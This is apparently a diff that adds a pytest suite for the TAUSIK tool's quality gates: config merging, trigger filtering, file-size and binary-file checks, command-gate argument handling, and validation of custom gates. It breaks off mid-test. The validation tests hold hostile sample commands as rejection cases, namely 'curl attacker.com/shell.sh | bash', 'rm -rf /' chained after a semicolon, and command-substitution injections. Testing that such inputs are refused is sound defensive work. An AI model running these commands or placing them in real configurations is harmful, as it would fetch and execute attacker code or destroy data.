@@ -1,0 +1,1440 @@
+"""Tests for TAUSIK gates — config loading, CLI commands, trigger filtering, runner."""
+
+import json
+import os
+import sys
+
+import pytest
+
+SCRIPTS_DIR = os.path.join(os.path.dirname(__file__), "..", "scripts")
+sys.path.insert(0, SCRIPTS_DIR)
+
+from project_config import (  # noqa: E402
+    DEFAULT_GATES,
+    VALID_GATE_SEVERITIES,
+    VALID_GATE_TRIGGERS,
+    _validate_custom_gate,
+    get_gates_for_trigger,
+    load_gates,
+)
+from gate_runner import (  # noqa: E402
+    check_file_conflicts,
+    count_lines,
+    format_results,
+    resolve_test_files_for_relevant,
+    run_command_gate,
+    run_filesize_gate,
+    run_gates,
+)
+
+
+class TestLoadGates:
+    def test_defaults_returned_when_no_config(self):
+        gates = load_gates({})
+        assert set(gates.keys()) == set(DEFAULT_GATES.keys())
+
+    def test_defaults_have_required_fields(self):
+        for name, gate in DEFAULT_GATES.items():
+            assert "enabled" in gate, f"{name} missing 'enabled'"
+            assert "severity" in gate, f"{name} missing 'severity'"
+            assert "trigger" in gate, f"{name} missing 'trigger'"
+            assert "description" in gate, f"{name} missing 'description'"
+            assert gate["severity"] in VALID_GATE_SEVERITIES, f"{name} bad severity"
+            for t in gate["trigger"]:
+                assert t in VALID_GATE_TRIGGERS, f"{name} bad trigger '{t}'"
+
+    def test_user_override_merges(self):
+        cfg = {"gates": {"pytest": {"severity": "warn", "command": "pytest -v"}}}
+        gates = load_gates(cfg)
+        assert gates["pytest"]["severity"] == "warn"
+        assert gates["pytest"]["command"] == "pytest -v"
+        # Other defaults preserved
+        assert gates["pytest"]["enabled"] is True
+        # v1.4 Verify-First: pytest moved from task-done to verify trigger
+        assert "verify" in gates["pytest"]["trigger"]
+
+    def test_user_can_add_custom_gate(self):
+        cfg = {
+            "gates": {
+                "eslint": {
+                    "enabled": True,
+                    "severity": "block",
+                    "trigger": ["commit"],
+                    "command": "eslint {files}",
+                    "description": "Lint JS",
+                }
+            }
+        }
+        gates = load_gates(cfg)
+        assert "eslint" in gates
+        assert gates["eslint"]["command"] == "eslint {files}"
+
+    def test_user_disable_overrides_default(self):
+        cfg = {"gates": {"ruff": {"enabled": False}}}
+        gates = load_gates(cfg)
+        assert gates["ruff"]["enabled"] is False
+
+    def test_empty_config_returns_defaults(self):
+        gates = load_gates(None)  # will call load_config which may fail in test
+        # In test env without .tausik/config.json this should still work
+        # because load_config returns {} when file doesn't exist
+        assert isinstance(gates, dict)
+
+
+class TestGetGatesForTrigger:
+    def test_commit_gates(self):
+        gates = get_gates_for_trigger("commit", {})
+        names = {g["name"] for g in gates}
+        assert "ruff" in names
+        assert "filesize" in names
+        # pytest is task-done + review, not commit
+        assert "pytest" not in names
+
+    def test_task_done_gates(self):
+        # v1.4 Verify-First Contract: task-done now contains only cheap gates
+        # (filesize, tdd_order). Heavy gates (pytest, tsc, cargo, ...) moved
+        # to the new "verify" trigger so MCP hosts don't hang.
+        gates = get_gates_for_trigger("task-done", {})
+        names = {g["name"] for g in gates}
+        assert "filesize" in names
+        assert "pytest" not in names  # was here before v1.4
+        assert "ruff" not in names  # commit-only
+
+    def test_verify_gates(self):
+        """v1.4: heavy subprocess gates fire on `tausik verify`, not task_done."""
+        gates = get_gates_for_trigger("verify", {})
+        names = {g["name"] for g in gates}
+        assert "pytest" in names
+
+    def test_review_gates(self):
+        gates = get_gates_for_trigger("review", {})
+        names = {g["name"] for g in gates}
+        assert "pytest" in names
+        # bandit is disabled by default
+        assert "bandit" not in names
+
+    def test_disabled_gate_excluded(self):
+        cfg = {"gates": {"pytest": {"enabled": False}}}
+        gates = get_gates_for_trigger("task-done", cfg)
+        names = {g["name"] for g in gates}
+        assert "pytest" not in names
+
+    def test_enabled_bandit_included(self):
+        cfg = {"gates": {"bandit": {"enabled": True}}}
+        gates = get_gates_for_trigger("review", cfg)
+        names = {g["name"] for g in gates}
+        assert "bandit" in names
+
+    def test_unknown_trigger_returns_empty(self):
+        gates = get_gates_for_trigger("deploy", {})
+        assert gates == []
+
+    def test_each_gate_has_name_key(self):
+        gates = get_gates_for_trigger("commit", {})
+        for g in gates:
+            assert "name" in g
+            assert isinstance(g["name"], str)
+
+
+class TestGatesCLI:
+    """CLI smoke tests via subprocess."""
+
+    @pytest.fixture
+    def tausik_env(self, tmp_path):
+        tausik_dir = tmp_path / ".tausik"
+        tausik_dir.mkdir()
+        env = os.environ.copy()
+        env["TAUSIK_DIR"] = str(tausik_dir)
+        return tmp_path, env
+
+    def _run(self, args, env, cwd=None):
+        import subprocess
+
+        cmd = [sys.executable, os.path.join(SCRIPTS_DIR, "project.py")] + args
+        return subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+            env=env,
+            cwd=cwd,
+            timeout=30,
+        )
+
+    def test_gates_status(self, tausik_env):
+        _, env = tausik_env
+        # Need init first
+        r = self._run(["init", "--name", "test"], env)
+        assert r.returncode == 0
+        r = self._run(["gates", "status"], env)
+        assert r.returncode == 0
+        assert "Quality Gates:" in r.stdout
+        assert "pytest" in r.stdout
+
+    def test_gates_list(self, tausik_env):
+        _, env = tausik_env
+        self._run(["init", "--name", "test"], env)
+        r = self._run(["gates", "list"], env)
+        assert r.returncode == 0
+        assert "ruff" in r.stdout
+
+    def test_gates_enable_disable(self, tausik_env):
+        tmp_path, env = tausik_env
+        self._run(["init", "--name", "test"], env)
+        # Enable bandit
+        r = self._run(["gates", "enable", "bandit"], env)
+        assert r.returncode == 0
+        assert "enabled" in r.stdout
+        # Check config file
+        cfg_path = tmp_path / ".tausik" / "config.json"
+        cfg = json.loads(cfg_path.read_text())
+        assert cfg["gates"]["bandit"]["enabled"] is True
+        # Disable
+        r = self._run(["gates", "disable", "bandit"], env)
+        assert r.returncode == 0
+        cfg = json.loads(cfg_path.read_text())
+        assert cfg["gates"]["bandit"]["enabled"] is False
+
+
+class TestGateRunner:
+    def test_count_lines(self, tmp_path):
+        f = tmp_path / "test.py"
+        f.write_text("line1\nline2\nline3\n")
+        assert count_lines(str(f)) == 3
+
+    def test_count_lines_nonexistent(self):
+        assert count_lines("/nonexistent/file.py") == 0
+
+    def test_filesize_gate_pass(self, tmp_path):
+        f = tmp_path / "small.py"
+        f.write_text("x\n" * 100)
+        gate = {"max_lines": 400}
+        passed, output = run_filesize_gate(gate, [str(f)])
+        assert passed is True
+
+    def test_filesize_gate_fail(self, tmp_path):
+        f = tmp_path / "big.py"
+        f.write_text("x\n" * 500)
+        gate = {"max_lines": 400}
+        passed, output = run_filesize_gate(gate, [str(f)])
+        assert passed is False
+        assert "500 lines" in output
+
+    def test_filesize_gate_empty_files(self):
+        gate = {"max_lines": 400}
+        passed, _ = run_filesize_gate(gate, [])
+        assert passed is True
+
+    def test_filesize_gate_exempts_research_dir(self, tmp_path):
+        # Research dumps (convention #122) grow large by design — exempt in the
+        # committed gate, not just the gitignored .tausik/config.json.
+        research = tmp_path / "docs" / "ru" / "research"
+        research.mkdir(parents=True)
+        big = research / "tausik-dump.md"
+        big.write_text("x\n" * 900)
+        gate = {"max_lines": 400}
+        passed, _ = run_filesize_gate(gate, [str(big)])
+        assert passed is True
+
+    def test_filesize_gate_non_research_md_still_blocks(self, tmp_path):
+        # Negative: the research exemption must not over-exempt — a large markdown
+        # outside docs/{en,ru}/research/ still violates the line cap.
+        other = tmp_path / "docs" / "ru" / "guide.md"
+        other.parent.mkdir(parents=True)
+        other.write_text("x\n" * 900)
+        gate = {"max_lines": 400}
+        passed, output = run_filesize_gate(gate, [str(other)])
+        assert passed is False
+        assert "900 lines" in output
+
+    def test_filesize_gate_exempts_cli_reference(self, tmp_path):
+        # docs/{en,ru}/cli.md is the full CLI command reference — grows by design
+        # (one entry per command), exempt in the committed gate like CHANGELOG.
+        cli = tmp_path / "docs" / "en" / "cli.md"
+        cli.parent.mkdir(parents=True)
+        cli.write_text("x\n" * 900)
+        passed, _ = run_filesize_gate({"max_lines": 400}, [str(cli)])
+        assert passed is True
+
+    # --- l26-filesize-gate-revisit (decision #190): cap 400→500 + committed exempts ---
+
+    def test_filesize_default_cap_is_500(self, tmp_path):
+        # AC1: interim cap raised to 500. A file the size a merged wrapper would
+        # produce (~485 lines, e.g. gate_runner 393 + gate_filesize 97) now passes
+        # WITHOUT an explicit max_lines — the pressure to split it away is gone.
+        merged = tmp_path / "merged_module.py"
+        merged.write_text("x\n" * 485)
+        passed, _ = run_filesize_gate({}, [str(merged)])
+        assert passed is True
+
+    def test_registry_filesize_default_max_lines_is_500(self):
+        # AC1: the canonical runtime source (gate default_config) carries 500.
+        assert DEFAULT_GATES["filesize"]["max_lines"] == 500
+
+    def test_filesize_gate_still_blocks_genuinely_bloated_file(self, tmp_path):
+        # AC4: regression preserved — a file at 2× the concept (>500) still blocks.
+        big = tmp_path / "god_object.py"
+        big.write_text("x\n" * 600)
+        passed, output = run_filesize_gate({}, [str(big)])
+        assert passed is False
+        assert "600 lines" in output and "max 500" in output
+
+    def test_filesize_boundary_fails_then_passes(self, tmp_path):
+        # AC4: fails-then-passes across the cap boundary. The same 600-line file is
+        # blocked at the 500 cap and allowed once the cap is lifted above it.
+        f = tmp_path / "boundary.py"
+        f.write_text("x\n" * 600)
+        assert run_filesize_gate({"max_lines": 500}, [str(f)])[0] is False
+        assert run_filesize_gate({"max_lines": 700}, [str(f)])[0] is True
+
+    def test_exempt_dir_from_committed_config_not_source(self, tmp_path, monkeypatch):
+        # AC3: an exemption set by the COMMITTED tausik/gates.json (injected here via
+        # TAUSIK_GATES_CONFIG) takes effect WITHOUT editing gate_filesize.py source.
+        # 'vendored/' is deliberately absent from the hardcoded fallback list.
+        import gate_filesize
+
+        assert not any("vendored/" in d for d in gate_filesize._FILESIZE_EXEMPT_DIRS)
+        cfg = tmp_path / "gates.json"
+        cfg.write_text(json.dumps({"filesize": {"exempt_dirs": ["vendored/"]}}))
+        big = tmp_path / "vendored" / "huge_lib.py"
+        big.parent.mkdir(parents=True)
+        big.write_text("x\n" * 900)
+        # Without the config the file blocks…
+        assert run_filesize_gate({"max_lines": 500}, [str(big)])[0] is False
+        # …with the committed config it is exempt.
+        monkeypatch.setenv("TAUSIK_GATES_CONFIG", str(cfg))
+        assert run_filesize_gate({"max_lines": 500}, [str(big)])[0] is True
+
+    def test_exempt_basename_from_committed_config(self, tmp_path, monkeypatch):
+        # AC3: exempt_basenames is equally config-driven, matched anywhere in tree.
+        cfg = tmp_path / "gates.json"
+        cfg.write_text(json.dumps({"filesize": {"exempt_basenames": ["generated_pb2.py"]}}))
+        f = tmp_path / "src" / "generated_pb2.py"
+        f.parent.mkdir(parents=True)
+        f.write_text("x\n" * 900)
+        monkeypatch.setenv("TAUSIK_GATES_CONFIG", str(cfg))
+        assert run_filesize_gate({"max_lines": 500}, [str(f)])[0] is True
+
+    def test_committed_config_merges_over_defaults_never_drops(self, tmp_path, monkeypatch):
+        # AC3: committed config EXTENDS the fallback (union) — a config that only
+        # adds 'vendored/' must not drop the baseline 'tests/' exemption.
+        import gate_filesize
+
+        cfg = tmp_path / "gates.json"
+        cfg.write_text(json.dumps({"filesize": {"exempt_dirs": ["vendored/"]}}))
+        monkeypatch.setenv("TAUSIK_GATES_CONFIG", str(cfg))
+        dirs, _ = gate_filesize._resolve_exempts()
+        assert "vendored/" in dirs and "tests/" in dirs
+
+    def test_malformed_committed_config_degrades_to_defaults(self, tmp_path, monkeypatch):
+        # convention #226: a broken config must not crash the gate (that would block
+        # every close for a reason unrelated to the file under review) — it degrades
+        # to the hardcoded fallbacks.
+        import gate_filesize
+
+        cfg = tmp_path / "gates.json"
+        cfg.write_text("{ this is not valid json")
+        monkeypatch.setenv("TAUSIK_GATES_CONFIG", str(cfg))
+        dirs, names = gate_filesize._resolve_exempts()
+        assert dirs == gate_filesize._FILESIZE_EXEMPT_DIRS
+        assert names == gate_filesize._FILESIZE_EXEMPT_BASENAMES
+
+    def test_exempt_dir_matches_on_segment_boundary_not_substring(self):
+        # review s146 finding M2: 'tests/' must exempt tests/ but NOT unittests/.
+        import gate_filesize
+
+        assert gate_filesize._path_under_exempt_dir("tests/foo.py", "tests/") is True
+        assert gate_filesize._path_under_exempt_dir("a/tests/foo.py", "tests/") is True
+        assert gate_filesize._path_under_exempt_dir("scripts/unittests/x.py", "tests/") is False
+        assert gate_filesize._path_under_exempt_dir("backtests/x.py", "tests/") is False
+        assert (
+            gate_filesize._path_under_exempt_dir("docs/ru/research/x.md", "docs/ru/research/")
+            is True
+        )
+
+    def test_bloated_file_in_lookalike_dir_still_blocks(self, tmp_path):
+        # integration for M2: a 900-line file in unittests/ is NOT exempted by
+        # the baseline 'tests/' entry and still fails the cap.
+        d = tmp_path / "unittests"
+        d.mkdir()
+        big = d / "huge.py"
+        big.write_text("x\n" * 900)
+        passed, output = run_filesize_gate({"max_lines": 500}, [str(big)])
+        assert passed is False and "900 lines" in output
+
+    def test_committed_config_lookup_stops_at_git_root(self, tmp_path):
+        # review s146 finding M1: a foreign tausik/gates.json ABOVE the repo's
+        # .git must never be adopted for this project.
+        import gate_filesize
+
+        outer = tmp_path / "ci-workspace"
+        (outer / "tausik").mkdir(parents=True)
+        (outer / "tausik" / "gates.json").write_text(
+            '{"filesize": {"exempt_dirs": ["FOREIGN/"]}}', encoding="utf-8"
+        )
+        repo = outer / "repo"
+        (repo / ".git").mkdir(parents=True)  # repo-root marker
+        sub = repo / "scripts"
+        sub.mkdir()
+        # Walk from inside the repo (no local tausik/gates.json) must stop at .git
+        # and return None — never the outer foreign config.
+        assert gate_filesize._committed_gates_config_path(str(sub)) is None
+
+    # --- filesize-gate-counts-lines-in-binary-files: the cap is a SOURCE rule ---
+
+    @staticmethod
+    def _write_binary_pdf(path, lines=600):
+        """A real (small) binary file: PDF magic, the binary comment bytes every
+        real PDF carries, and NUL bytes inside the payload. Deterministic — the
+        fixture does not depend on what a compressor happens to emit.
+        """
+        path.write_bytes(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n" + (b"\x00\x01\n" * lines))
+        return path
+
+    def test_binary_file_does_not_violate_the_line_cap(self, tmp_path):
+        # AC1 reproduction (observed live in session #177): task done with a PDF in
+        # relevant_files failed as 'N lines (max 500)'. Those were 0x0A bytes in a
+        # compressed stream, not source lines — a refusal for a violation that does
+        # not exist. RED before the type filter: count_lines reports 602.
+        pdf = self._write_binary_pdf(tmp_path / "TAUSIK-report-survey.pdf")
+        passed, output = run_filesize_gate({"max_lines": 500}, [str(pdf)])
+        assert passed is True, output
+
+    def test_binary_detection_reads_content_not_the_extension(self, tmp_path):
+        # AC3: the decision is content-driven. An extension list is never complete —
+        # the next binary format arrives with the next task. Here a binary payload
+        # wears a .md name and must still be recognised as non-text.
+        disguised = self._write_binary_pdf(tmp_path / "notes.md")
+        assert run_filesize_gate({"max_lines": 500}, [str(disguised)])[0] is True
+
+    def test_long_text_wearing_a_binary_extension_still_blocks(self, tmp_path):
+        # AC3, the other direction: content decides, so a plain-text file named
+        # .pdf is still source as far as the cap is concerned. An extension-based
+        # implementation would wrongly let this through.
+        textish = tmp_path / "handbook.pdf"
+        textish.write_text("x\n" * 900, encoding="utf-8")
+        passed, output = run_filesize_gate({"max_lines": 500}, [str(textish)])
+        assert passed is False
+        assert "900 lines" in output
+
+    def test_long_text_file_still_violates_the_cap(self, tmp_path):
+        # AC5: the relaxation must not lift the gate off sources — that is what it
+        # was raised for (decision #190). A long .py is unaffected by the type filter.
+        src = tmp_path / "god_object.py"
+        src.write_text("def f():\n    pass\n" * 400, encoding="utf-8")
+        passed, output = run_filesize_gate({"max_lines": 500}, [str(src)])
+        assert passed is False
+        assert "800 lines" in output
+
+    def test_utf8_cyrillic_source_is_not_mistaken_for_binary(self, tmp_path):
+        # AC6: half this repo's sources carry Cyrillic docstrings. A naive
+        # 'decodes as ascii' check would call them binary and silence the gate on
+        # them. The NUL/UTF-8 signal must not.
+        import gate_filesize
+
+        ru = tmp_path / "модуль.py"
+        ru.write_text('"""Гейт размера считает строки."""\n' * 600, encoding="utf-8")
+        assert gate_filesize.is_binary_file(str(ru)) is False
+        passed, output = run_filesize_gate({"max_lines": 500}, [str(ru)])
+        assert passed is False
+        assert "600 lines" in output
+
+    def test_multibyte_char_straddling_the_sniff_boundary_is_not_binary(self, tmp_path):
+        # AC6, the trap inside the trap: the sniff reads a fixed prefix, so a
+        # 2-byte Cyrillic character can be cut in half at the boundary. A plain
+        # bytes.decode() on that prefix raises and would report every long Russian
+        # file as binary. Padding is sized so the boundary lands mid-character.
+        import gate_filesize
+
+        f = tmp_path / "straddle.py"
+        pad = gate_filesize._BINARY_SNIFF_BYTES - 1
+        f.write_bytes(b"#" * pad + "я".encode() + b"\n# tail\n" * 600)
+        assert gate_filesize.is_binary_file(str(f)) is False
+        assert run_filesize_gate({"max_lines": 500}, [str(f)])[0] is False
+
+    def test_undecodable_bytes_without_a_nul_are_binary(self, tmp_path):
+        # AC3: the NUL check alone is not enough — some binary formats carry no NUL
+        # in their first kilobytes. Failure to decode as UTF-8 is the second signal.
+        import gate_filesize
+
+        f = tmp_path / "image.dat"
+        f.write_bytes(b"\xff\xd8\xff\xe0" + (b"\xc3\x28\n" * 600))
+        assert gate_filesize.is_binary_file(str(f)) is True
+        assert run_filesize_gate({"max_lines": 500}, [str(f)])[0] is True
+
+    def test_empty_file_is_not_binary(self, tmp_path):
+        # Degenerate input: an empty file has no evidence of being non-text, and it
+        # cannot violate a line cap either way. It must not crash the sniff.
+        import gate_filesize
+
+        f = tmp_path / "empty.py"
+        f.write_bytes(b"")
+        assert gate_filesize.is_binary_file(str(f)) is False
+        assert run_filesize_gate({"max_lines": 500}, [str(f)])[0] is True
+
+    def test_command_gate_pass(self):
+        gate = {"command": "python -c \"print('ok')\""}
+        passed, output = run_command_gate(gate, [])
+        assert passed is True
+        assert "ok" in output
+
+    def test_command_gate_fail(self):
+        gate = {"command": 'python -c "import sys; sys.exit(1)"'}
+        passed, output = run_command_gate(gate, [])
+        assert passed is False
+
+    def test_command_gate_no_command(self):
+        """A gate with no command CANNOT RUN, so it must not answer PASS.
+
+        check-result-conflates-could-not-run-with-passed: this used to assert
+        ``passed is True`` — a check that never executed reporting success,
+        which is the defect the outcome type exists to make unspellable.
+        """
+        import gate_outcome
+
+        gate = {"command": None}
+        outcome = run_command_gate(gate, [])
+        assert outcome.outcome == gate_outcome.COULD_NOT_RUN
+        assert outcome.reason_code == gate_outcome.REASON_NO_GATE_IMPLEMENTATION
+        assert outcome.blocks is True
+        assert outcome.ran is False
+
+    def test_command_gate_files_substitution(self, tmp_path):
+        f = tmp_path / "test.txt"
+        f.write_text("hello")
+        gate = {"command": 'python -c "import sys; print(sys.argv)" {files}'}
+        passed, output = run_command_gate(gate, [str(f)])
+        assert passed is True
+
+    def test_pytest_gate_full_lane_env_var_injects_override(self, tmp_path, monkeypatch):
+        """v14b-pytest-fast-lane: TAUSIK_VERIFY_FULL=1 makes pytest gate run the
+        full battery (override pyproject.toml addopts='-m not slow').
+
+        The override is a MARKER expression, not an addopts wipe. Wiping addopts
+        also deleted everything else standing in it — in this repository `-n auto`,
+        so the one run that was supposed to be the full battery was the only one
+        that went back to a single core. `-m ''` beats the addopts marker because
+        it is parsed later, and leaves the rest of the line alone.
+        """
+        monkeypatch.setenv("TAUSIK_VERIFY_FULL", "1")
+        # Use a python -c stub that prints argv, dressed up as a 'pytest' command
+        # so the env-var branch fires (the check is on the leading executable).
+        gate = {"command": "pytest -q --collect-only"}
+        # We cannot actually run pytest here without a real suite; instead we
+        # patch subprocess.run to capture the composed cmd.
+        import gate_runner
+
+        captured: dict = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            from types import SimpleNamespace
+
+            return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+        monkeypatch.setattr(gate_runner.subprocess, "run", fake_run)
+        passed, _ = run_command_gate(gate, [])
+        assert passed is True
+        # argv[0] is resolved to a launchable path (…/Scripts/pytest.EXE), so the
+        # runner is recognised by its basename rather than by the literal token.
+        argv = list(captured["cmd"])
+        assert os.path.basename(argv[0]).lower().startswith("pytest"), argv
+        assert argv[1:3] == ["-m", ""], (
+            "TAUSIK_VERIFY_FULL must inject `-m ''` right after the pytest token so "
+            f"the marker filter in addopts is overridden; got {argv}"
+        )
+        assert not any(a.startswith("--override-ini=addopts") for a in argv), (
+            "the full lane must not WIPE addopts: that also deletes -n auto and "
+            f"runs the full battery serially; got {argv}"
+        )
+
+    def test_pytest_gate_default_does_not_inject_override(self, tmp_path, monkeypatch):
+        """Without TAUSIK_VERIFY_FULL, pytest cmd is unchanged (fast-lane stays)."""
+        monkeypatch.delenv("TAUSIK_VERIFY_FULL", raising=False)
+        gate = {"command": "pytest -q --collect-only"}
+        import gate_runner
+
+        captured: dict = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            from types import SimpleNamespace
+
+            return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+        monkeypatch.setattr(gate_runner.subprocess, "run", fake_run)
+        passed, _ = run_command_gate(gate, [])
+        assert passed is True
+        assert "--override-ini" not in captured["cmd"]
+        assert "-m" not in captured["cmd"], (
+            "no TAUSIK_VERIFY_FULL, no marker override — the fast lane stays"
+        )
+
+    def test_full_env_var_does_not_affect_non_pytest_gates(self, tmp_path, monkeypatch):
+        """Negative scenario: TAUSIK_VERIFY_FULL only injects into pytest cmd."""
+        monkeypatch.setenv("TAUSIK_VERIFY_FULL", "1")
+        gate = {"command": "ruff check {files}"}
+        import gate_runner
+
+        captured: dict = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            from types import SimpleNamespace
+
+            return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+        monkeypatch.setattr(gate_runner.subprocess, "run", fake_run)
+        run_command_gate(gate, [])
+        assert "--override-ini" not in captured["cmd"]
+        assert "-m" not in captured["cmd"], (
+            "ruff has no -m; injecting one would make the gate refuse to start"
+        )
+
+    def test_pytest_via_python_m_gets_override(self, monkeypatch):
+        """Windows fix: pytest is detected as a TOKEN, so `python.exe -m pytest`
+        (not just a leading `pytest`) gets the full-lane override injected. The
+        pre-fix startswith() check missed this form entirely."""
+        monkeypatch.setenv("TAUSIK_VERIFY_FULL", "1")
+        gate = {"command": "python -m pytest -q"}
+        import gate_runner
+
+        captured: dict = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            from types import SimpleNamespace
+
+            return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+        monkeypatch.setattr(gate_runner.subprocess, "run", fake_run)
+        passed, _ = run_command_gate(gate, [])
+        assert passed is True
+        # argv form (no shell operators) — cmd is the argv list. Compared as a
+        # SEQUENCE, not as a joined string: the injected marker expression is the
+        # empty argument, which a join renders as nothing at all.
+        argv = list(captured["cmd"])
+        i = argv.index("pytest")
+        assert argv[i - 1] == "-m" and "python" in argv[i - 2].lower(), (
+            f"this case is about `python -m pytest`; got {argv}"
+        )
+        assert argv[i + 1 : i + 4] == ["-m", "", "-q"], (
+            "the override must be injected right after the pytest TOKEN, not at the "
+            f"leading executable; got {argv}"
+        )
+
+    def test_command_gate_resolves_argv0(self, monkeypatch):
+        """argv[0] is made launchable by a shell-less spawn.
+
+        Two promises, one place. A configured forward-slash venv path
+        (backend/.venv/Scripts/python.exe) is normpath'd — the original Windows
+        fix. A BARE executable is now resolved on PATH as well
+        (js-test-gate-silent-on-windows-and-override-dropped, GitLab #9): this
+        test used to assert "bare executable must be untouched", and untouched
+        is precisely what made every `npm`/`yarn` gate die with [WinError 2],
+        because CreateProcess does not consult PATHEXT and npm ships as
+        `npm.CMD`. Leaving the name alone was the defect, not the contract.
+        """
+        import gate_runner
+
+        captured: dict = {}
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            from types import SimpleNamespace
+
+            return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+        monkeypatch.setattr(gate_runner.subprocess, "run", fake_run)
+
+        run_command_gate({"command": "backend/.venv/Scripts/python.exe -c pass"}, [])
+        assert captured["cmd"][0] == os.path.normpath("backend/.venv/Scripts/python.exe")
+
+        run_command_gate({"command": "ruff check ."}, [])
+        resolved = captured["cmd"][0]
+        assert os.path.isabs(resolved), (
+            "a bare executable must be resolved to something CreateProcess can "
+            f"launch, got {resolved!r}"
+        )
+        assert os.path.basename(resolved).lower().startswith("ruff")
+
+        # An unresolvable name stays as written, so the caller can report
+        # COULD_NOT_RUN / command_not_runnable instead of a substituted tool.
+        run_command_gate({"command": "definitely-not-installed-xyz check"}, [])
+        assert captured["cmd"][0] == "definitely-not-installed-xyz"
+
+    def test_format_results_empty(self):
+        assert "No gates" in format_results([])
+
+    def test_format_results_pass(self):
+        results = [{"name": "pytest", "severity": "block", "passed": True, "output": "ok"}]
+        out = format_results(results)
+        assert "PASS" in out
+        assert "pytest" in out
+
+    def test_format_results_fail(self):
+        results = [
+            {
+                "name": "ruff",
+                "severity": "block",
+                "passed": False,
+                "output": "error on line 5",
+            }
+        ]
+        out = format_results(results)
+        assert "FAIL" in out
+        assert "error on line 5" in out
+
+    def test_run_gates_all_disabled(self, monkeypatch):
+        """All gates disabled for trigger → passes."""
+        monkeypatch.setattr(
+            "gate_runner.get_gates_for_trigger",
+            lambda trigger, cfg: [],
+        )
+        monkeypatch.setattr("gate_runner.load_config", lambda: {})
+        passed, results = run_gates("deploy", [])
+        assert passed is True
+        assert results == []
+
+
+class TestStackGates:
+    """Test multi-language gates and auto-enable by stack."""
+
+    def test_stack_gate_map_built(self):
+        from project_config import STACK_GATE_MAP
+
+        assert "go" in STACK_GATE_MAP
+        assert "go-vet" in STACK_GATE_MAP["go"]
+        assert "rust" in STACK_GATE_MAP
+        assert "cargo-check" in STACK_GATE_MAP["rust"]
+        assert "typescript" in STACK_GATE_MAP
+        assert "tsc" in STACK_GATE_MAP["typescript"]
+
+    def test_all_stack_gates_disabled_by_default(self):
+        gates = load_gates({})
+        for name in (
+            "tsc",
+            "eslint",
+            "go-vet",
+            "golangci-lint",
+            "cargo-check",
+            "clippy",
+            "phpstan",
+            "phpcs",
+            "javac",
+            "ktlint",
+        ):
+            assert gates[name]["enabled"] is False, f"{name} should be disabled by default"
+
+    def test_auto_enable_for_typescript(self):
+        from project_config import auto_enable_gates_for_stacks
+
+        cfg: dict = {}
+        enabled = auto_enable_gates_for_stacks(cfg, ["typescript"])
+        assert "tsc" in enabled
+        assert "eslint" in enabled
+        assert cfg["gates"]["tsc"]["enabled"] is True
+        assert cfg["gates"]["eslint"]["enabled"] is True
+
+    def test_auto_enable_for_go(self):
+        from project_config import auto_enable_gates_for_stacks
+
+        cfg: dict = {}
+        enabled = auto_enable_gates_for_stacks(cfg, ["go"])
+        assert "go-vet" in enabled
+        assert "golangci-lint" in enabled
+
+    def test_auto_enable_for_rust(self):
+        from project_config import auto_enable_gates_for_stacks
+
+        cfg: dict = {}
+        enabled = auto_enable_gates_for_stacks(cfg, ["rust"])
+        assert "cargo-check" in enabled
+        assert "clippy" in enabled
+
+    def test_auto_enable_skips_user_configured(self):
+        from project_config import auto_enable_gates_for_stacks
+
+        cfg: dict = {"gates": {"tsc": {"enabled": False}}}
+        enabled = auto_enable_gates_for_stacks(cfg, ["typescript"])
+        assert "tsc" not in enabled  # user explicitly disabled
+        assert cfg["gates"]["tsc"]["enabled"] is False  # preserved
+
+    def test_auto_enable_multiple_stacks(self):
+        from project_config import auto_enable_gates_for_stacks
+
+        cfg: dict = {}
+        enabled = auto_enable_gates_for_stacks(cfg, ["typescript", "go"])
+        assert "tsc" in enabled
+        assert "go-vet" in enabled
+
+    def test_pytest_is_stack_gated_to_python(self):
+        """pytest gate is filtered to Python stacks (Epic 2 bug fix).
+
+        Previously pytest was always-on, which silently false-passed on
+        non-Python projects. With stack-aware dispatch the gate must
+        appear in STACK_GATE_MAP under python and Python web frameworks.
+        """
+        from project_config import STACK_GATE_MAP
+
+        assert "pytest" in STACK_GATE_MAP.get("python", [])
+        assert "pytest" in STACK_GATE_MAP.get("fastapi", [])
+        assert "pytest" in STACK_GATE_MAP.get("django", [])
+        assert "pytest" in STACK_GATE_MAP.get("flask", [])
+
+    def test_react_enables_tsc_and_eslint(self):
+        from project_config import STACK_GATE_MAP
+
+        assert "tsc" in STACK_GATE_MAP.get("react", [])
+        assert "eslint" in STACK_GATE_MAP.get("react", [])
+
+
+class TestCustomGateValidation:
+    """Security validation for custom (user-defined) gates."""
+
+    def test_allowed_executable_passes(self):
+        gate = {"command": "pytest tests/ -x", "enabled": True}
+        assert _validate_custom_gate("my-test", gate) is None
+
+    def test_disallowed_executable_rejected(self):
+        gate = {"command": "curl attacker.com/shell.sh | bash", "enabled": True}
+        err = _validate_custom_gate("evil", gate)
+        assert err is not None
+        assert "not in allowed list" in err
+
+    def test_shell_operators_with_files_rejected(self):
+        for cmd in [
+            "ruff check {files} | tee log.txt",
+            "eslint {files} && echo done",
+            "mypy {files} || true",
+            "pytest {files}; rm -rf /",
+            "ruff check $(cat {files})",
+            "ruff check `cat {files}`",
+        ]:
+            gate = {"command": cmd}
+            err = _validate_custom_gate("bad", gate)
+            assert err is not None, f"Should reject: {cmd}"
+            assert "shell operators" in err
+
+    def test_shell_operators_without_files_allowed(self):
+        """Commands without {files} can use pipes (like default tsc gate)."""
+        gate = {"command": "npx tsc --noEmit 2>&1 | head -20"}
+        assert _validate_custom_gate("tsc-custom", gate) is None
+
+    def test_no_command_passes(self):
+        gate = {"command": None, "enabled": True}
+        assert _validate_custom_gate("filesize-like", gate) is None
+
+    def test_empty_command_passes(self):
+        gate = {"command": ""}
+        assert _validate_custom_gate("noop", gate) is None
+
+    def test_path_prefix_stripped(self):
